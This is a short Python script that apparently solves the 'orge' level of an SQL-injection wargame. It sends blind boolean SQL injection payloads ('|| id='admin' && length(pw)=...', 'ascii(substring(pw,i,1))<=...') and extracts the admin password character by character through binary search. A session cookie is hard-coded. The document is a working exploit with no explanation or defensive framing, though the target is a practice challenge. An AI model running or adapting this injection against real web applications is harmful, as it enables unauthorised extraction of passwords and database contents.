import requests

url = 'https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php'
cookie = '39je4ges6g212tfsms39bnhqk5'

# Get the length of the password
length = 1
while True:
    payload = f"?pw=' || id='admin' %26%26 length(pw)={length} %23 "

    res = requests.get(url=f'{url}{payload}', cookies={'PHPSESSID': cookie})

    if '<h2>Hello admin</h2>' in res.text:
        break

    length += 1

print(f'*** Found length: {length} ***')

# Get the password by binary search
password = ''
for i in range(1, length + 1):

    low = ord('0')
    high = ord('z')
    while low <= high:
        mid = (low + high) // 2
        payload = f"?pw=' || id='admin' %26%26 ascii(substring(pw,{i},1))<={mid} %23 "
        res = requests.get(url=f'{url}{payload}', cookies={'PHPSESSID': cookie})

        if '<h2>Hello admin</h2>' in res.text:
            high = mid - 1
        else:
            low = mid + 1
    password += chr(low)
    print(f'Current password: {password}')

print(f'*** Found Password: {password} ***')
